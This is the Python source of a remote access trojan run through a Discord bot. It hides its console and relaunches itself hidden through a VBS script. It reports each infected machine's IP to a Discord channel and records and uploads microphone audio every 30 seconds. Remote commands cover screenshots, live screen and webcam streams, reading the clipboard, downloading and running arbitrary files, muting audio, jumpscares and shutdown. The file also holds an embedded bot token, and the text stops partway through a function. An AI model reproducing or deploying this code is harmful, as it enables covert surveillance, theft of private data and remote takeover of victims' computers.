# Place this at the very top of the file, before any other imports
import ctypes
import platform
import sys
import os

# Immediately hide console window at the earliest possible moment
if platform.system() == "Windows":
    try:
        # Get the console window handle
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd != 0:
            # Hide the console window (0 = SW_HIDE)
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass

# Now continue with the rest of your imports
from urllib.request import urlretrieve
import shutil
import discord
from discord.ext import commands
import pyautogui
from datetime import datetime
import cv2
import pyaudio
import wave
import threading
import time
import numpy as np
import socket
import asyncio
import glob
import webbrowser
import re
import requests
import subprocess
import tempfile
import win32api
import win32con
import math
import tkinter as tk
from PIL import Image, ImageTk

# Immediately hide console window at startup
if platform.system() == "Windows":
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd != 0:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception as e:
        print(f"Error hiding console: {str(e)}")

# Function definitions for hiding console and relaunching
def hide_console_window():
    """Hide the console window on Windows"""
    try:
        if platform.system() == "Windows":
            import ctypes
            
            # Get the console window handle
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            
            if hwnd != 0:
                # Hide the console window
                ctypes.windll.user32.ShowWindow(hwnd, 0)
                return True
        return False
    except Exception as e:
        print(f"Error hiding console: {str(e)}")
        return False

def relaunch_as_hidden():
    """Relaunch the script in hidden mode if it's running in a visible console"""
    try:
        # Only needed on Windows
        if platform.system() != "Windows":
            return False
            
        # Get the full path of the current script
        script_path = os.path.abspath(sys.argv[0])
        
        # Check if we're running in a console window
        if sys.stdout.isatty():
            # We're in a console, so relaunch using pythonw (hidden)
            if script_path.endswith('.py'):
                # Create a VBS script to launch the Python script hidden
                vbs_path = os.path.join(tempfile.gettempdir(), "launch_hidden.vbs")
                with open(vbs_path, 'w') as f:
                    f.write(f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "pythonw.exe ""{script_path}""", 0, False''')
                
                # Execute the VBS script
                subprocess.Popen(['cscript', '//Nologo', vbs_path])
                
                # Delete the VBS script after a short delay
                def delete_vbs():
                    time.sleep(5)
                    try:
                        os.remove(vbs_path)
                    except:
                        pass
                
                threading.Thread(target=delete_vbs, daemon=True).start()
                
                # Exit the current process
                os._exit(0)
                return True
    except Exception as e:
        print(f"Error relaunching as hidden: {str(e)}")
    return False

# Bot configuration
TOKEN = 'MTM2MjkxNDQ5MDI5MDgwMjY4OA.GZPzE3.WEKeeYq4ZgJDpE8PnHdMXNpyKoFPyPsUqm6oac'  # Replace with your actual Discord token
PREFIX = '!'

# Set up intents (permissions)
intents = discord.Intents.default()
intents.message_content = True

# Create bot instance with disabled default help command
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

# Add this global check function right here
@bot.check
async def check_system_channel(ctx):
    """Global check that runs before every command"""
    # Allow commands in DMs
    if ctx.guild is None:
        return True
        
    # Get reference to global variables
    global SYSTEM_CHANNEL_ID, AUDIO_CHANNEL_ID
        
    # Check if the command is in the system's channel
    if ctx.channel.id == SYSTEM_CHANNEL_ID:
        return True
        
    # Check if the channel name contains this system's ID
    # This allows commands to work in channels specifically named for this system
    if SYSTEM_ID in ctx.channel.name.lower():
        # Update the system channel ID to this channel
        SYSTEM_CHANNEL_ID = ctx.channel.id
        AUDIO_CHANNEL_ID = ctx.channel.id
        return True
        
    # Silently ignore commands in other channels
    return False

# Audio recording settings
CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
RECORD_SECONDS = 30
GAIN = 5.0  # Increase this value to amplify the audio (be careful with too high values)

# Screen update tracking
screen_update_tasks = {}  # Dictionary to track active screen update tasks

# Update your jumpscare configuration with the correct URLs
JUMPSCARE_VIDEO_URL = "https://github.com/gamerpaul546/daw/raw/refs/heads/main/Untitled%20video%20-%20Made%20with%20Clipchamp%20(2).mp4"
JUMPSCARE_AUDIO_URL = "https://github.com/gamerpaul546/daw/raw/refs/heads/main/(Audio)%20jumpscare.m4a"

# System identification
SYSTEM_NAME = platform.node()
try:
    # Get the external IP address using api.ipify.org
    response = requests.get('https://api.ipify.org')
    if response.status_code == 200:
        SYSTEM_IP = response.text
    else:
        # Fallback to local IP if external IP fetch fails
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        SYSTEM_IP = s.getsockname()[0]
        s.close()
except:
    SYSTEM_IP = "unknown-ip"

# Create a unique identifier for this system
# This helps prevent duplicate channels
SYSTEM_ID = f"{SYSTEM_NAME}-{SYSTEM_IP}".lower().replace(' ', '-')
# Remove any characters that aren't allowed in Discord channel names
SYSTEM_ID = re.sub(r'[^a-z0-9_-]', '', SYSTEM_ID)

# Channel for this system
SYSTEM_CHANNEL_ID = None
AUDIO_CHANNEL_ID = None

# Flag to track if recording is in progress
is_recording = False

# Lock for audio processing
audio_lock = threading.Lock()

@bot.event
async def on_ready():
    print(f'{bot.user.name} has connected to Discord!')
    print(f'Bot is in {len(bot.guilds)} guilds')
    
    # Clean up any existing audio files at startup
    cleanup_audio_files()
    
    # Create or find a channel for this system
    await setup_system_channel()
    
    # Start background recording
    threading.Thread(target=background_recording, daemon=True).start()

def cleanup_audio_files():
    """Clean up any existing audio files from previous runs"""
    audio_files = glob.glob("audio_*.wav")
    for file in audio_files:
        try:
            os.remove(file)
            print(f"Cleaned up old audio file: {file}")
        except Exception as e:
            print(f"Error cleaning up file {file}: {str(e)}")

async def setup_system_channel():
    global SYSTEM_CHANNEL_ID, AUDIO_CHANNEL_ID
    
    # Use the first guild the bot is in
    if len(bot.guilds) == 0:
        print("Bot is not in any guilds. Please add the bot to a guild.")
        return
    
    guild = bot.guilds[0]
    channel_name = SYSTEM_ID
    
    # Check if channel already exists for this system
    existing_channel = discord.utils.get(guild.text_channels, name=channel_name)
    
    if existing_channel:
        SYSTEM_CHANNEL_ID = existing_channel.id
        AUDIO_CHANNEL_ID = existing_channel.id
        print(f"Using existing channel: #{channel_name} (ID: {SYSTEM_CHANNEL_ID})")
        
        # Send a reconnection message
        try:
            await existing_channel.send(f"🔄 **System Reconnected**\n"
                                       f"**System Name:** {SYSTEM_NAME}\n"
                                       f"**IP Address:** {SYSTEM_IP}\n"
                                       f"**Reconnected at:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        except Exception as e:
            print(f"Error sending reconnection message: {str(e)}")
    else:
        # Create a new channel for this system
        try:
            channel = await guild.create_text_channel(channel_name)
            SYSTEM_CHANNEL_ID = channel.id
            AUDIO_CHANNEL_ID = channel.id
            print(f"Created new channel: #{channel_name} (ID: {SYSTEM_CHANNEL_ID})")
            
            # Send initial message to the channel
            await channel.send(f"🖥️ **New System Connected**\n"
                              f"**System Name:** {SYSTEM_NAME}\n"
                              f"**IP Address:** {SYSTEM_IP}\n"
                              f"**OS:** {platform.system()} {platform.release()}\n"
                              f"**Connected at:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                              f"Use `{PREFIX}help` to see available commands.")
        except Exception as e:
            print(f"Error creating channel: {str(e)}")

def amplify_audio(audio_data, gain):
    """Amplify the audio data by the given gain factor"""
    # Convert bytes to numpy array
    audio_array = np.frombuffer(audio_data, dtype=np.int16)
    
    # Apply gain (with clipping to prevent overflow)
    audio_array = np.clip(audio_array * gain, -32768, 32767).astype(np.int16)
    
    # Convert back to bytes
    return audio_array.tobytes()

def background_recording():
    global is_recording
    
    # Wait for channel to be set up
    while AUDIO_CHANNEL_ID is None:
        time.sleep(1)
    
    p = pyaudio.PyAudio()
    
    while True:
        with audio_lock:  # Use lock to prevent concurrent recording/uploading
            if not is_recording:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                audio_path = f'audio_{timestamp}.wav'
                
                # Open audio stream
                stream = p.open(format=FORMAT,
                                channels=CHANNELS,
                                rate=RATE,
                                input=True,
                                frames_per_buffer=CHUNK)
                
                print(f"Recording started at {timestamp}")
                is_recording = True
                frames = []
                
                # Record for RECORD_SECONDS
                for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                    data = stream.read(CHUNK, exception_on_overflow=False)
                    frames.append(data)
                
                # Stop recording
                stream.stop_stream()
                stream.close()
                
                # Amplify the audio
                amplified_frames = [amplify_audio(frame, GAIN) for frame in frames]
                
                # Save the audio file
                wf = wave.open(audio_path, 'wb')
                wf.setnchannels(CHANNELS)
                wf.setsampwidth(p.get_sample_size(FORMAT))
                wf.setframerate(RATE)
                wf.writeframes(b''.join(amplified_frames))
                wf.close()
                
                print(f"Recording finished and saved to {audio_path}")
                
                # Send the audio file to the designated channel
                # Use asyncio.run_coroutine_threadsafe to properly run the coroutine from a thread
                future = asyncio.run_coroutine_threadsafe(
                    send_audio_to_channel(audio_path, timestamp),
                    bot.loop
                )
                
                # Wait for the upload to complete before starting a new recording
                try:
                    future.result(timeout=60)  # Wait up to 60 seconds for upload
                except Exception as e:
                    print(f"Error waiting for upload: {str(e)}")
                    # Make sure to delete the file if upload fails
                    if os.path.exists(audio_path):
                        try:
                            os.remove(audio_path)
                            print(f"Deleted file {audio_path} after upload error")
                        except:
                            pass
                
                is_recording = False

async def send_audio_to_channel(audio_path, timestamp):
    """Send the audio recording to the designated channel"""
    if not AUDIO_CHANNEL_ID:
        print("No channel ID set for audio uploads")
        # Delete the file even if we can't upload it
        if os.path.exists(audio_path):
            os.remove(audio_path)
            print(f"Deleted file {audio_path} (no upload channel set)")
        return
    
    channel = bot.get_channel(AUDIO_CHANNEL_ID)
    if not channel:
        print(f"Could not find channel with ID {AUDIO_CHANNEL_ID}")
        # Delete the file even if we can't find the channel
        if os.path.exists(audio_path):
            os.remove(audio_path)
            print(f"Deleted file {audio_path} (channel not found)")
        return
    
    try:
        # Check if file exists before trying to upload
        if not os.path.exists(audio_path):
            print(f"File {audio_path} does not exist, cannot upload")
            return
        
        await channel.send(f'🎙️ Audio recording from {SYSTEM_NAME} at {timestamp}', file=discord.File(audio_path))
        print(f"Successfully sent audio recording to channel {channel.name}")
    except Exception as e:
        print(f"Error sending audio to channel: {str(e)}")
    finally:
        # Always delete the file, whether upload succeeded or failed
        try:
            if os.path.exists(audio_path):
                os.remove(audio_path)
                print(f"Deleted file {audio_path}")
        except Exception as e:
            print(f"Error deleting file {audio_path}: {str(e)}")

@bot.command(name='help', help='Shows this help message')
async def help_command(ctx):
    # Create a system-specific help message
    embed = discord.Embed(
        title=f"Commands for {SYSTEM_NAME}",
        description=f"These commands control the system at IP: {SYSTEM_IP}",
        color=discord.Color.blue()
    )
    
    # Add command fields to the embed
    embed.add_field(
        name=f"{PREFIX}screenshot",
        value="Takes a screenshot of the system and sends it to the channel",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}webcam",
        value="Takes a photo using the system's webcam and sends it to the channel",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}screen [duration]",
        value="Provides a live view of the screen, updating every 0.5 seconds. Optional duration in seconds (default: 30, max: 300)",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}stopscreen",
        value="Stops the live screen view",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}webcamstream [duration]",
        value="Provides a live view of the webcam, updating every 0.5 seconds. Optional duration in seconds (default: 30, max: 300)",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}stopwebcam",
        value="Stops the live webcam view",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}media",
        value="Plays a media file on the target system. Attach an MP4, MP3, or other media file to your message",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}search [query]",
        value="Searches Google for the specified query and displays it in full screen",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}background",
        value="Changes the desktop background. Either attach an image or provide a URL to an image",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}clipboard [text]",
        value="Without text: Shows the current clipboard contents. With text: Sets the clipboard to the provided text.",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}downloadfileandrun",
        value="Downloads an attached file and runs it on the target system. Attach the file you want to execute.",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}disableaudio",
        value="Disables (mutes) the system audio until enabled again",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}enableaudio",
        value="Enables (unmutes) the system audio",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}shutdown [delay]",
        value="Shuts down the target computer. Optional delay in seconds (default: 0)",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}end",
        value="Terminates the bot process on the target system",
        inline=False
    )
    
    embed.add_field(
        name=f"{PREFIX}help",
        value="Shows this help message",
        inline=False
    )
    
    # Add info about background audio recording
    embed.add_field(
        name="Background Audio Recording",
        value=f"The system automatically records audio in 30-second segments and uploads them to the system's channel",
        inline=False
    )
    
    # Add footer with bot info
    embed.set_footer(text=f"System: {SYSTEM_NAME} | IP: {SYSTEM_IP}")
    
    await ctx.send(embed=embed)

@bot.command(name='screenshot', help='Takes a screenshot of the system')
async def take_screenshot(ctx):
    # Take the screenshot
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    screenshot_path = f'screenshot_{timestamp}.png'
    
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        
        # Send the screenshot
        await ctx.send(f'📷 Screenshot from {SYSTEM_NAME} taken at {timestamp}', file=discord.File(screenshot_path))
        
        # Clean up the file after sending
        os.remove(screenshot_path)
    except Exception as e:
        await ctx.send(f'❌ Error taking screenshot: {str(e)}')
        # Clean up the file even if sending fails
        if os.path.exists(screenshot_path):
            os.remove(screenshot_path)

@bot.command(name='downloadfileandrun', help='Downloads an attached file and runs it')
async def download_file_and_run(ctx):
    try:
        # Check if a file was attached to the message
        if len(ctx.message.attachments) == 0:
            await ctx.send("❌ Please attach a file to download and run.")
            return
            
        # Get the first attachment
        attachment = ctx.message.attachments[0]
        
        # Create a temporary directory to store the file
        temp_dir = tempfile.mkdtemp()
        file_path = os.path.join(temp_dir, attachment.filename)
        
        await ctx.send(f"⏳ Downloading file {attachment.filename} to run on {SYSTEM_NAME}...")
        
        # Download the file
        await attachment.save(file_path)
        
        await ctx.send(f"⏳ Running file {attachment.filename} on {SYSTEM_NAME}...")
        
        # Determine how to run the file based on its extension
        file_ext = os.path.splitext(attachment.filename)[1].lower()
        
        # Flag to track if execution was attempted
        execution_attempted = False
        
        if platform.system() == "Windows":
            if file_ext == '.py':
                # Run Python script with visible console for debugging
                process = subprocess.Popen(['python', file_path], 
                                          creationflags=subprocess.CREATE_NEW_CONSOLE)
                execution_attempted = True
                await ctx.send(f"🔄 Started Python script with process ID: {process.pid}")
            elif file_ext in ['.exe', '.bat', '.cmd']:
                # Run executable or batch file with visible console
                process = subprocess.Popen(file_path, 
                                          creationflags=subprocess.CREATE_NEW_CONSOLE)
                execution_attempted = True
                await ctx.send(f"🔄 Started executable with process ID: {process.pid}")
            elif file_ext == '.ps1':
                # Run PowerShell script with visible window
                process = subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-File', file_path], 
                                          creationflags=subprocess.CREATE_NEW_CONSOLE)
                execution_attempted = True
                await ctx.send(f"🔄 Started PowerShell script with process ID: {process.pid}")
            elif file_ext == '.vbs':
                # Run VBScript with visible window
                process = subprocess.Popen(['cscript', '//nologo', file_path], 
                                          creationflags=subprocess.CREATE_NEW_CONSOLE)
                execution_attempted = True
                await ctx.send(f"🔄 Started VBScript with process ID: {process.pid}")
            else:
                # Try to run with the default application
                try:
                    os.startfile(file_path)
                    execution_attempted = True
                    await ctx.send(f"🔄 Opened file with default application")
                except Exception as e:
                    await ctx.send(f"⚠️ Could not open with default application: {str(e)}")
        
        elif platform.system() == "Darwin":  # macOS
            if file_ext == '.py':
                # Run Python script
                process = subprocess.Popen(['python3', file_path])
                execution_attempted = True
                await ctx.send(f"🔄 Started Python script with process ID: {process.pid}")
            elif file_ext == '.sh':
                # Make shell script executable and run it
                os.chmod(file_path, 0o755)
                process = subprocess.Popen([file_path])
                execution_attempted = True
                await ctx.send(f"🔄 Started shell script with process ID: {process.pid}")
            else:
                # Try to run with the default application
                process = subprocess.Popen(['open', file_path])
                execution_attempted = True
                await ctx.send(f"🔄 Opened file with default application")
        
        elif platform.system() == "Linux":
            if file_ext == '.py':
                # Run Python script
                process = subprocess.Popen(['python3', file_path])
                execution_attempted = True
                await ctx.send(f"🔄 Started Python script with process ID: {process.pid}")
            elif file_ext == '.sh':
                # Make shell script executable and run it
                os.chmod(file_path, 0o755)
                process = subprocess.Popen([file_path])
                execution_attempted = True
                await ctx.send(f"🔄 Started shell script with process ID: {process.pid}")
            else:
                # Try to run with the default application
                process = subprocess.Popen(['xdg-open', file_path])
                execution_attempted = True
                await ctx.send(f"🔄 Opened file with default application")
        
        if execution_attempted:
            await ctx.send(f"✅ File {attachment.filename} is now running on {SYSTEM_NAME}")
        else:
            await ctx.send(f"⚠️ Could not determine how to run file with extension {file_ext}")
            
        # Don't delete the file immediately to allow it to run
        # You might want to add a cleanup task that runs after some time
        
    except Exception as e:
        await ctx.send(f"❌ Error downloading or running file: {str(e)}")
        import traceback
        tb = traceback.format_exc()
        await ctx.send(f"Detailed error:\n```\n{tb[:1500]}\n```")
        
        # Clean up if an error occurs
        if 'temp_dir' in locals():
            try:
                shutil.rmtree(temp_dir)
            except:
                pass

@bot.command(name='webcam', help='Takes a photo using the webcam')
async def take_webcam_photo(ctx):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    webcam_path = f'webcam_{timestamp}.jpg'
    
    try:
        # Initialize webcam
        cap = cv2.VideoCapture(0)  # 0 is usually the default webcam
        
        if not cap.isOpened():
            await ctx.send("❌ Error: Could not access webcam.")
            return
        
        # Capture frame
        ret, frame = cap.read()
        
        if not ret:
            await ctx.send("❌ Error: Could not capture image from webcam.")
            cap.release()
            return
        
        # Save the image
        cv2.imwrite(webcam_path, frame)
        
        # Release the webcam
        cap.release()
        
        # Send the image
        await ctx.send(f'📸 Webcam photo from {SYSTEM_NAME} taken at {timestamp}', file=discord.File(webcam_path))
        
        # Clean up the file after sending
        os.remove(webcam_path)
    except Exception as e:
        await ctx.send(f'❌ Error taking webcam photo: {str(e)}')
        # Clean up the file even if sending fails
        if os.path.exists(webcam_path):
            os.remove(webcam_path)

@bot.command(name='media', help='Plays a media file on the target system')
async def play_media(ctx):
    try:
        # Check if a file was attached to the message
        if len(ctx.message.attachments) == 0:
            await ctx.send("❌ Please attach a media file to play.")
            return
        
        # Get the first attachment
        attachment = ctx.message.attachments[0]
        
        # Check if it's a media file
        file_ext = os.path.splitext(attachment.filename)[1].lower()
        valid_extensions = ['.mp4', '.mp3', '.avi', '.mov', '.wmv', '.m4a', '.wav']
        
        if file_ext not in valid_extensions:
            await ctx.send(f"❌ Invalid file type. Supported types: {', '.join(valid_extensions)}")
            return
        
        # Create a temporary directory to store the file
        temp_dir = tempfile.mkdtemp()
        media_path = os.path.join(temp_dir, attachment.filename)
        
        await ctx.send(f"⏳ Downloading media file to play on {SYSTEM_NAME}...")
        
        # Download the file
        await attachment.save(media_path)
        
        await ctx.send(f"⏳ Playing media file on {SYSTEM_NAME}...")
        
        # Play the file based on the operating system
        if platform.system() == "Windows":
            # For Windows, use the default media player
            media_process = subprocess.Popen(['start', '', media_path], shell=True)
            
            # Wait for a moment to ensure the player has started
            time.sleep(2)
            
            # Try to make the video fullscreen
            pyautogui.press('f')  # Many players use 'f' for fullscreen
            
        elif platform.system() == "Darwin":  # macOS
            # For macOS, use 'open' which will use the default application
            media_process = subprocess.Popen(['open', media_path])
            
        elif platform.system() == "Linux":
            # For Linux, try using 'xdg-open' which will use the default application
            media_process = subprocess.Popen(['xdg-open', media_path])
        
        await ctx.send(f"✅ Media playback started on {SYSTEM_NAME}")
        
        # Wait for a while before cleaning up (adjust time as needed)
        # For now, we'll let the media play and clean up after 5 minutes
        # You might want to add a command to stop playback early
        await asyncio.sleep(300)  # Wait 5 minutes
        
        # Clean up processes and files
        try:
            if platform.system() == "Windows":
                # On Windows, terminate common media player processes
                os.system('taskkill /f /im wmplayer.exe')  # Windows Media Player
                os.system('taskkill /f /im vlc.exe')  # VLC
                os.system('taskkill /f /im QuickTimePlayer.exe')  # QuickTime
            else:
                # On other systems, try to terminate the process
                if 'media_process' in locals():
                    media_process.terminate()
        except:
            pass
        
        # Clean up the temporary directory and files
        shutil.rmtree(temp_dir)
        
    except Exception as e:
        await ctx.send(f"❌ Error playing media: {str(e)}")
        # Clean up if an error occurs
        if 'temp_dir' in locals():
            shutil.rmtree(temp_dir)

@bot.command(name='search', help='Searches Google for the specified query and displays it in full screen')
async def search_google(ctx, *, query=None):
    try:
        # Check if a search query was provided
        if query is None:
            await ctx.send("❌ Please provide a search query. Example: `!search cute puppies`")
            return
        
        await ctx.send(f"🔍 Searching for '{query}' on {SYSTEM_NAME}...")
        
        # Format the query for a URL
        import urllib.parse
        search_url = f"https://www.google.com/search?q={urllib.parse.quote_plus(query)}"
        
        # Open the URL in the default browser
        webbrowser.open(search_url)
        
        # Wait a moment for the browser to open
        time.sleep(2)
        
        # Attempt to make the browser full screen
        if platform.system() == "Windows":
            # Press F11 to toggle full screen in most browsers
            pyautogui.press('f11')
        elif platform.system() == "Darwin":  # macOS
            # Command+Control+F is often used for full screen in macOS browsers
            pyautogui.hotkey('command', 'ctrl', 'f')
        else:  # Linux
            # F11 is common in Linux browsers too
            pyautogui.press('f11')
        
        await ctx.send(f"✅ Google search for '{query}' opened in full screen on {SYSTEM_NAME}")
        
    except Exception as e:
        await ctx.send(f"❌ Error performing search: {str(e)}")

@bot.command(name='clipboard', help='View or modify the clipboard contents')
async def clipboard_command(ctx, *, text=None):
    try:
        if text is None:
            # Get clipboard content
            if platform.system() == "Windows":
                # Just get the current clipboard content, skip history
                import win32clipboard
                win32clipboard.OpenClipboard()
                try:
                    current_clipboard = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                except:
                    current_clipboard = "No text content in current clipboard"
                finally:
                    win32clipboard.CloseClipboard()
                
                clipboard_content = current_clipboard
                
            elif platform.system() == "Darwin":  # macOS
                clipboard_content = subprocess.check_output(['pbpaste']).decode('utf-8', errors='replace')
            elif platform.system() == "Linux":
                clipboard_content = subprocess.check_output(['xclip', '-selection', 'clipboard', '-o']).decode('utf-8', errors='replace')
            else:
                clipboard_content = "Clipboard access not supported on this OS"
                
            # Send the clipboard content
            if clipboard_content.strip():
                # Always send as a file to ensure all content is captured
                temp_file = f'clipboard_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write(clipboard_content)
                
                # Also send a preview in the message if it's not too long
                preview = clipboard_content[:1500] + "..." if len(clipboard_content) > 1500 else clipboard_content
                await ctx.send(f"📋 Clipboard content from {SYSTEM_NAME}:\n```\n{preview}\n```\nFull content attached:",
                               file=discord.File(temp_file))
                
                # Clean up the temp file
                os.remove(temp_file)
            else:
                await ctx.send(f"📋 Clipboard on {SYSTEM_NAME} is empty or contains non-text content")
        else:
            # Set clipboard content
            if platform.system() == "Windows":
                import win32clipboard
                win32clipboard.OpenClipboard()
                win32clipboard.EmptyClipboard()
                win32clipboard.SetClipboardText(text, win32clipboard.CF_UNICODETEXT)
                win32clipboard.CloseClipboard()
            elif platform.system() == "Darwin":  # macOS
                subprocess.run(['pbcopy'], input=text.encode('utf-8'))
            elif platform.system() == "Linux":
                subprocess.run(['xclip', '-selection', 'clipboard'], input=text.encode('utf-8'))
            else:
                await ctx.send("❌ Setting clipboard not supported on this OS")
                return
                
            await ctx.send(f"✅ Clipboard content on {SYSTEM_NAME} has been updated")
    except Exception as e:
        await ctx.send(f"❌ Error accessing clipboard: {str(e)}")

@bot.command(name='background', help='Changes the desktop background of the target system')
async def change_background(ctx, url=None):
    try:
        # Check if a file was attached or a URL was provided
        if len(ctx.message.attachments) == 0 and url is None:
            await ctx.send("❌ Please attach an image file or provide an image URL.")
            return
        
        # Create a temporary directory to store the image
        temp_dir = tempfile.mkdtemp()
        
        # Determine the source of the image (attachment or URL)
        if len(ctx.message.attachments) > 0:
            # Get the first attachment
            attachment = ctx.message.attachments[0]
            
            # Check if it's an image file
            file_ext = os.path.splitext(attachment.filename)[1].lower()
            valid_extensions = ['.jpg', '.jpeg', '.png', '.bmp', '.gif']
            
            if file_ext not in valid_extensions:
                await ctx.send(f"❌ Invalid file type. Supported types: {', '.join(valid_extensions)}")
                shutil.rmtree(temp_dir)
                return
            
            # Download the attached image
            image_path = os.path.join(temp_dir, attachment.filename)
            await attachment.save(image_path)
            await ctx.send(f"⏳ Downloading attached image to set as background on {SYSTEM_NAME}...")
            
        else:
            # Download the image from the URL
            try:
                # Check if the URL is valid
                response = requests.head(url)
                content_type = response.headers.get('content-type', '')
                
                if not content_type.startswith('image/'):
                    await ctx.send("❌ The URL does not point to a valid image.")
                    shutil.rmtree(temp_dir)
                    return
                
                # Download the image
                image_path = os.path.join(temp_dir, "background" + os.path.splitext(url)[1])
                urlretrieve(url, image_path)
                await ctx.send(f"⏳ Downloading image from URL to set as background on {SYSTEM_NAME}...")
                
            except Exception as e:
                await ctx.send(f"❌ Error downloading image from URL: {str(e)}")
                shutil.rmtree(temp_dir)
                return
        
        # Set the desktop background based on the operating system
        if platform.system() == "Windows":
            import ctypes
            # Use the Windows API to set the wallpaper
            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
            success = True
            
        elif platform.system() == "Darwin":  # macOS
            # Use AppleScript to set the desktop background
            script = f'''
            tell application "Finder"
                set desktop picture to POSIX file "{image_path}"
            end tell
            '''
            subprocess.run(['osascript', '-e', script])
            success = True
            
        elif platform.system() == "Linux":
            # Try to set the background using common desktop environments
            # GNOME
            try:
                subprocess.run(['gsettings', 'set', 'org.gnome.desktop.background', 'picture-uri', f'file://{image_path}'])
                success = True
            except:
                # KDE
                try:
                    script = f'''
                    var allDesktops = desktops();
                    for (i=0;i<allDesktops.length;i++) {{
                        d = allDesktops[i];
                        d.wallpaperPlugin = "org.kde.image";
                        d.currentConfigGroup = Array("Wallpaper", "org.kde.image", "General");
                        d.writeConfig("Image", "file://{image_path}");
                    }}
                    '''
                    subprocess.run(['qdbus', 'org.kde.plasmashell', '/PlasmaShell', 'org.kde.PlasmaShell.evaluateScript', script])
                    success = True
                except:
                    # XFCE
                    try:
                        subprocess.run(['xfconf-query', '-c', 'xfce4-desktop', '-p', '/backdrop/screen0/monitor0/workspace0/last-image', '-s', image_path])
                        success = True
                    except:
                        success = False
        else:
            success = False
        
        if success:
            await ctx.send(f"✅ Desktop background changed successfully on {SYSTEM_NAME}")
        else:
            await ctx.send(f"❌ Could not change desktop background on {SYSTEM_NAME}. Unsupported operating system.")
        
        # Keep the image file for a while to ensure it's properly set
        await asyncio.sleep(10)
        
        # Clean up the temporary directory and files
        shutil.rmtree(temp_dir)
        
    except Exception as e:
        await ctx.send(f"❌ Error changing background: {str(e)}")
        # Clean up if an error occurs
        if 'temp_dir' in locals():
            shutil.rmtree(temp_dir)

@bot.command(name='shutdown', help='Shuts down the target computer')
async def shutdown_computer(ctx, delay: int = 0):
    try:
        # Send a confirmation message
        await ctx.send(f"⚠️ Shutting down {SYSTEM_NAME} in {delay} seconds...")
        
        # Execute the shutdown command based on the operating system
        if platform.system() == "Windows":
            # For Windows, use the shutdown command with specified delay
            if delay > 0:
                subprocess.Popen(f'shutdown /s /t {delay}', shell=True)
            else:
                subprocess.Popen('shutdown /s /t 0', shell=True)
                
        elif platform.system() == "Darwin":  # macOS
            # For macOS, use the 'shutdown' command
            if delay > 0:
                subprocess.Popen(f'sudo shutdown -h +{delay//60}', shell=True)
            else:
                subprocess.Popen('sudo shutdown -h now', shell=True)
                
        elif platform.system() == "Linux":
            # For Linux, use the 'shutdown' command
            if delay > 0:
                subprocess.Popen(f'sudo shutdown -h +{delay//60}', shell=True)
            else:
                subprocess.Popen('sudo shutdown -h now', shell=True)
        else:
            await ctx.send(f"❌ Shutdown not supported on {platform.system()}")
            return
            
        # Send a final message before shutdown
        await ctx.send(f"🛑 Shutdown initiated on {SYSTEM_NAME}. System will power off shortly.")
        
    except Exception as e:
        await ctx.send(f"❌ Error shutting down system: {str(e)}")

@bot.command(name='end', help='Terminates the bot process on the target system')
async def end_process(ctx):
    try:
        # Send a message before terminating
        await ctx.send(f"🛑 Terminating bot process on {SYSTEM_NAME}...")
        
        # Make sure the message is sent before exiting
        await asyncio.sleep(2)
        
        # Exit the process completely
        os._exit(0)  # Using os._exit() instead of sys.exit() for immediate termination
    except Exception as e:
        await ctx.send(f"❌ Error terminating process: {str(e)}")

# Add this to your global variables
screen_update_tasks = {}  # Dictionary to track active screen update tasks

@bot.command(name='disableaudio', help='Disables system audio until enabled again')
async def disable_audio(ctx):
    try:
        if platform.system() == "Windows":
            # Use pycaw to control audio
            from ctypes import cast, POINTER
            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(
                IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            
            # Mute the system
            volume.SetMute(1, None)
            
            await ctx.send(f"🔇 System audio has been disabled on {SYSTEM_NAME}")
        else:
            await ctx.send(f"⚠️ This command is currently only supported on Windows")
    except Exception as e:
        await ctx.send(f"❌ Error disabling audio: {str(e)}")

@bot.command(name='enableaudio', help='Enables system audio')
async def enable_audio(ctx):
    try:
        if platform.system() == "Windows":
            # Use pycaw to control audio
            from ctypes import cast, POINTER
            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            
            devices = AudioUtilities.GetSpeakers()
